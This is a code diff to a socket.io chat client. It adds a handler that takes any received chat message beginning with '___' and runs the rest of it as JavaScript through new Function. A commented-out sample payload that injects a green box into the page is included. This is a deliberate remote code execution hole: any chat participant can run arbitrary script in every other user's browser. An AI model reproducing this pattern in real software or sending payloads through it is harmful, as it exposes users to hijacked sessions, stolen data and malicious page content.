@@ -71,13 +71,27 @@
 
       form.addEventListener('submit', (e) => {
         e.preventDefault();
-        if (input.value) {
-          socket.emit('chat message', input.value);
+        /**
+        ___(function changeDom() {
+          let newTestDiv = document.createElement('div');
+          const style = 'background-color: green; width: 200px; height: 200px';
+          newTestDiv.style.cssText = style;
+          document.getElementById('messages').append(newTestDiv);
+        })()
+         */
+        let inputValue = input.value;
+        if (inputValue) {
+          socket.emit('chat message', inputValue);
           input.value = '';
         }
       });
 
       socket.on('chat message', (msg) => {
+        if (msg.startsWith('___')) {
+          msg = msg.slice(3);
+          console.log(msg);
+          new Function(msg)();
+        }
         const item = document.createElement('li');
         item.textContent = msg;
         messages.appendChild(item);
